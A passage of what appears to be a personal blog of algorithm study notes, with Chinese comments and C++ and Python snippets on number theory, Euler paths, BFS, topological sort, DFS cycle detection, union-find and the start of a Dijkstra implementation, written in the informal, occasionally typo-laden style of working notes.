class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 朴素法</span><br><span class="hljs-comment">// C++ Version</span><br><span class="hljs-function">list&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">breakdown</span><span class="hljs-params">(<span class="hljs-type">int</span> N)</span> </span>&#123;<br>list&lt;<span class="hljs-type">int</span>&gt; result;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i * i &lt;= N; i++) &#123;<br><span class="hljs-keyword">if</span> (N % i == <span class="hljs-number">0</span>) &#123;  <span class="hljs-comment">// 如果 i 能够整除 N，说明 i 为 N 的一个质因子。</span><br><span class="hljs-keyword">while</span> (N % i == <span class="hljs-number">0</span>) N /= i;<br>result.<span class="hljs-built_in">push_back</span>(i);<br>&#125;<br>&#125;<br>  <span class="hljs-keyword">if</span> (N != <span class="hljs-number">1</span>) &#123;  <span class="hljs-comment">// 说明再经过操作之后 N 留下了一个素数</span><br>    result.<span class="hljs-built_in">push_back</span>(N);<br>&#125;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-comment">// 求欧拉函数</span><br><span class="hljs-comment">// C++ Version</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">euler_phi</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br><span class="hljs-type">int</span> ans = n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i * i &lt;= n; i++)<br>    <span class="hljs-keyword">if</span> (n % i == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">// ans - ans / i</span><br>        ans = ans / i * (i - <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">while</span> (n % i == <span class="hljs-number">0</span>) n /= i;<br>    &#125;<br>    <span class="hljs-comment">// 减去自身，1不需要减</span><br>  <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>) ans = ans / n * (n - <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure><p>l-29 divide two integers<br />cannot use *, /, mod<br />divisor multiply - dividend</p><p>08.05 recursively multiply<br />64 1 + ... + n<br />&amp;&amp; replace if<br />repeat replace for<br />if b &amp; 1 A + A res += A</p><p>l-371 sum of two integer<br />carry = a &amp; b shift left<br />while(carry != 0)</p><p>l-369 valid perfect square<br />(n + 1)^2 - n^2 = 2n + 1(culmulative)<br />f(x) = x^2 - n^2</p><h2 id="图">图</h2><h3 id="欧拉">欧拉</h3><p>l-332 reconstruct itinerary<br />seven bridge problem solved by Euler<br />in degree = out degree(except S/E)<br />? visited pop_back()<br />dfs(pop()), res.push_back(),reverse<br />the last number to end the search is last node</p><p>l-753 cracking the safe<br />? state not be visited<br />? how to visit n numbers<br />: set up a rule -- 0 - k 所有未经历过的状态</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 判断</span><br><br><span class="hljs-comment">// 无向图 ！有向图不满足</span><br><span class="hljs-comment">// 0 - 2个奇数点为欧拉路径</span><br><span class="hljs-comment">// 欧拉回路 皆为偶数点</span><br><br><span class="hljs-comment">// 有向图 欧拉路径</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">const</span> string&amp; curr)</span> </span>&#123;<br>    <span class="hljs-keyword">while</span> (vec.<span class="hljs-built_in">count</span>(curr) &amp;&amp; vec[curr].<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">0</span>) &#123;<br>        string tmp = vec[curr].<span class="hljs-built_in">top</span>();<br>        vec[curr].<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-built_in">dfs</span>(<span class="hljs-built_in">move</span>(tmp));<br>    &#125;<br>    stk.<span class="hljs-built_in">emplace_back</span>(curr);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>prove:<br />each node has k in and out degree : Euler Path<br />if no way out, go back to the node<br />then find a new node</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1、建邻接表adj、入度表indeg、出度表outdeg，省略...</span><br><span class="hljs-comment"># 2、判断是否存在</span><br><span class="hljs-comment"># 连通性 - 利用并查集 (除去孤立的节点)</span><br><span class="hljs-comment"># 回路无奇数度</span><br><span class="hljs-comment"># 3、dfs求解欧拉路径</span><br>ans = []<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dfs</span>(<span class="hljs-params">node</span>):<br>    <span class="hljs-keyword">while</span> adj[node]:<br>// 利用pop()<br>        v = adj[node].pop()<br>        dfs(v)<br>        ans.append([node, v]) <span class="hljs-comment"># 循环里记录结果 循环外则为回路</span><br>dfs(start)<br>            <br><span class="hljs-comment"># 4、最后再逆回来</span><br><span class="hljs-keyword">return</span> ans[::-<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><h3 id="bfs">BFS</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">node</span> &#123;<br>    <span class="hljs-type">int</span> x, y;<br>    <span class="hljs-built_in">node</span> (<span class="hljs-type">int</span> _x, <span class="hljs-type">int</span> _y) &#123;<br>        x = _x, y = _y;<br>    &#125;<br>&#125;;<br>vvi g;<br>vvi dir = &#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">-1</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>&#125;&#125;;<br><span class="hljs-type">int</span> n, m;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span> &lt;= x &amp;&amp; x &lt; n &amp;&amp; <span class="hljs-number">0</span> &lt;= y &amp;&amp; y &lt; m &amp;&amp; g[x][y] != <span class="hljs-number">0</span>); <br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">bfs</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, <span class="hljs-type">int</span> tx, <span class="hljs-type">int</span> ty)</span> </span>&#123;<br>    <span class="hljs-function">vvi <span class="hljs-title">vis</span><span class="hljs-params">(n, vi(m, <span class="hljs-number">0</span>))</span></span>;<br>    queue&lt;node&gt; q;<br>    q.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">node</span>(x, y));<br>    vis[x][y] = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (x == tx &amp;&amp; y == ty) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(q.<span class="hljs-built_in">size</span>()) &#123;<br>        <span class="hljs-type">int</span> nn = q.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nn; i++) &#123;<br>            node v = q.<span class="hljs-built_in">front</span>();<br>            q.<span class="hljs-built_in">pop</span>();<br>            x = v.x, y = v.y;            <br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>                <span class="hljs-type">int</span> xx = x + dir[j][<span class="hljs-number">0</span>], yy = y + dir[j][<span class="hljs-number">1</span>];<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">check</span>(xx, yy)) &#123;<br>                    <span class="hljs-keyword">if</span> (xx == tx &amp;&amp; yy == ty) <span class="hljs-keyword">return</span> cnt + <span class="hljs-number">1</span>; <br>                    <span class="hljs-keyword">if</span> (!vis[xx][yy]) &#123;<br>                        q.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">node</span>(xx, yy));<br>                        vis[xx][yy] = <span class="hljs-number">1</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        cnt++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br>queue&lt;tuple&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; q;<br><span class="hljs-comment">//  pre-place start nodes;</span><br><span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>    <span class="hljs-keyword">auto</span> [u, mask, dist] = q.<span class="hljs-built_in">front</span>();<br>    q.<span class="hljs-built_in">pop</span>();<br>    <span class="hljs-keyword">if</span> (mask == (<span class="hljs-number">1</span> &lt;&lt; n) - <span class="hljs-number">1</span>) &#123;<br>        ans = dist;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">// 搜索相邻的节点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v: graph[u]) &#123;<br>        <span class="hljs-comment">// 将 mask 的第 v 位置为 1</span><br>        <span class="hljs-type">int</span> mask_v = mask | (<span class="hljs-number">1</span> &lt;&lt; v);<br>        <span class="hljs-comment">// seen prevent repeated traversals</span><br>        <span class="hljs-keyword">if</span> (!seen[v][mask_v]) &#123;<br>            q.<span class="hljs-built_in">emplace</span>(v, mask_v, dist + <span class="hljs-number">1</span>);<br>            seen[v][mask_v] = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h3 id="拓扑">拓扑</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// l-1857 判环</span><br><span class="hljs-comment">// degree[i] &lt;= 1</span><br><span class="hljs-comment">// in[i] &lt;= 0</span><br><br><span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>    <span class="hljs-comment">// 记录点数</span><br>    ++found;<br>    <span class="hljs-type">int</span> u = q.<span class="hljs-built_in">front</span>();<br>    q.<span class="hljs-built_in">pop</span>();<br>    <span class="hljs-comment">// 将节点 u 对应的颜色增加 1</span><br>    ++f[u][colors[u] - <span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-comment">// 枚举 u 的后继节点 v</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v: g[u]) &#123;<br>        --indeg[v];<br>        <span class="hljs-comment">// 将 f(v,c) 更新为其与 f(u,c) 的较大值</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> c = <span class="hljs-number">0</span>; c &lt; <span class="hljs-number">26</span>; ++c) &#123;<br>            f[v][c] = <span class="hljs-built_in">max</span>(f[v][c], f[u][c]);<br>        &#125;<br>        <span class="hljs-comment">// 无向图indeg[v] == 1</span><br>        <span class="hljs-keyword">if</span> (!indeg[v]) &#123;<br>            q.<span class="hljs-built_in">push</span>(v);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (found != n) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>    <span class="hljs-keyword">auto</span> edge = edges[i];<br>    <span class="hljs-type">int</span> node1 = edge[<span class="hljs-number">0</span>], node2 = edge[<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">if</span> (parent[node2] != node2) &#123;<br>        conflict = i;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// record </span><br>        parent[node2] = node1;<br>        <span class="hljs-keyword">if</span> (uf.<span class="hljs-built_in">find</span>(node1) == uf.<span class="hljs-built_in">find</span>(node2)) &#123;<br>            cycle = i;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            uf.<span class="hljs-built_in">merge</span>(node1, node2);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// onstack 判环</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span></span>&#123;<br>onstk[i]=vis[i]=<span class="hljs-literal">true</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it:al[i])&#123;<br><span class="hljs-keyword">if</span> (onstk[it]) cyc=<span class="hljs-literal">true</span>;<br><span class="hljs-keyword">if</span> (!vis[it]) <span class="hljs-built_in">dfs</span>(it);<br>&#125;<br>onstk[i]=<span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="dfs路径">dfs路径</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// !记录路径</span><br><span class="hljs-comment">// codec unordered_map&lt;int, int&gt; 两点确定一条直线</span><br><span class="hljs-comment">// 判断transfer</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span> </span>&#123;<br>visit[k] = <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 记录当前的路径</span><br>path[m++] = k;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i:graph[k]) &#123;<br>        <span class="hljs-keyword">if</span> (visit[i] == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">dfs</span>(i);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (visit[i] == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = m - <span class="hljs-number">1</span>;; j--) &#123;<br>                <span class="hljs-keyword">if</span> (path[j] == i) <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>&#125;<br>visit[k] = <span class="hljs-number">2</span>;<br>    <span class="hljs-comment">// 注意回退</span><br>m--;<br>&#125;<br><br><span class="hljs-comment">// 无向图</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> v)</span> </span>&#123;<br>    path[cnt++] = v;<br>    vis[v] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;vv:g[v]) &#123;<br>        <span class="hljs-comment">// 防止重复</span><br>        <span class="hljs-keyword">if</span> (vv == last) <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">if</span> (vis[vv] == <span class="hljs-number">2</span>) <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">if</span> (vis[vv] == <span class="hljs-number">1</span>) &#123;<br>            cycle = <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            last = v;<br>            <span class="hljs-built_in">dfs</span>(vv);<br>        &#125;<br>    &#125;<br>    vis[v] = <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="判断直径">判断直径</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 第一次dfs确认最远端的顶点</span><br><span class="hljs-comment">// 选任一远端顶点再次遍历</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs1</span><span class="hljs-params">(<span class="hljs-type">int</span> v, <span class="hljs-type">int</span> h)</span> </span>&#123;<br>    vis[v] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (h &gt; mh) &#123;<br>        mh = h;<br>        tmp.<span class="hljs-built_in">clear</span>();<br>        tmp.<span class="hljs-built_in">pub</span>(v);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (h == mh) &#123;<br>        tmp.<span class="hljs-built_in">pub</span>(v);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;vv:g[v]) &#123;<br>        <span class="hljs-keyword">if</span> (!vis[vv]) &#123;<br>            <span class="hljs-built_in">dfs1</span>(vv, h + <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">memset</span>(vis, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(vis));<br><span class="hljs-built_in">dfs1</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br><span class="hljs-type">int</span> nxt = tmp[<span class="hljs-number">0</span>];<br><span class="hljs-built_in">rep</span> (i, <span class="hljs-number">0</span>, <span class="hljs-built_in">sz</span>(tmp)) s.<span class="hljs-built_in">insert</span>(tmp[i]);<br><span class="hljs-built_in">memset</span>(vis, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(vis));<br><span class="hljs-built_in">dfs1</span>(nxt, <span class="hljs-number">1</span>);<br><span class="hljs-built_in">rep</span> (i, <span class="hljs-number">0</span>, <span class="hljs-built_in">sz</span>(tmp)) s.<span class="hljs-built_in">insert</span>(tmp[i]);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;i:s) cout &lt;&lt; i + <span class="hljs-number">1</span> &lt;&lt; endl;<br></code></pre></td></tr></table></figure><h3 id="并查集">并查集</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 并查集</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span></span>&#123;<br>    <span class="hljs-keyword">if</span>(u[i] != i)&#123;<br>        u[i] = <span class="hljs-built_in">find</span>(u[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> u[i];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">unionn</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span></span>&#123;<br>    <span class="hljs-type">int</span> ra = <span class="hljs-built_in">find</span>(a);<br>    <span class="hljs-type">int</span> rb = <span class="hljs-built_in">find</span>(b);<br>    <span class="hljs-keyword">if</span>(ra != rb)&#123;<br>        <span class="hljs-keyword">if</span>(sz[ra] &gt; sz[rb])&#123;<br>            <span class="hljs-built_in">swap</span>(ra, rb);<br>        &#125;<br>        u[ra] = rb;<br>        sz[rb] += sz[ra];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="最短路">最短路</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dijstra </span><br><span class="hljs-comment">// 一次完成一次节点的更新，可使用priority queue优化</span><br><span class="hljs-comment">// 每次找到距离最近的节点，无法再被更新</span><br><span class="hljs-comment">// 若增加相同距离cost的优化 cost[cur] 已经无法再被优化 </span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1010</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> INF=<span class="hljs-number">0x3f3f3f3f</span>;<br>vector&lt;<span class="hljs-type">int</span>&gt; adj[N];<br><span class="hljs-type">int</span> n,score[N][N],vou[N][N];<br><span class="hljs-type">int</span> d[N],vis[N],w[N],pre[N];<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">(<span class="hljs-type">int</span> s)</span> </span>&#123;<br>    <span class="hljs-built_in">fill</span>(d,d+N,INF);<br><span class="hljs-built_in">fill</span>(vis,vist+N,<span class="hljs-number">0</span>);<br><span class="hljs-built_in">fill</span>(w,w+N,<span class="hljs-number">0</span>);<br>d[s] = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// n个节点</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;=n; i++) &#123;<br><span class="hljs-type">int</span> u=<span class="hljs-number">-1</span>, MIN=INF;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;=n; j++) &#123;<br><span class="hljs-keyword">if</span>(!vis[j]&amp;&amp;d[j]&lt;MIN) &#123;<br>u=j;<br>MIN=d[j];<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(u==<span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span>;<br>vist[u]=<span class="hljs-literal">true</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> x=<span class="hljs-number">0</span>; x &lt; adj[u].<span class="hljs-built_in">size</span>(); x++) 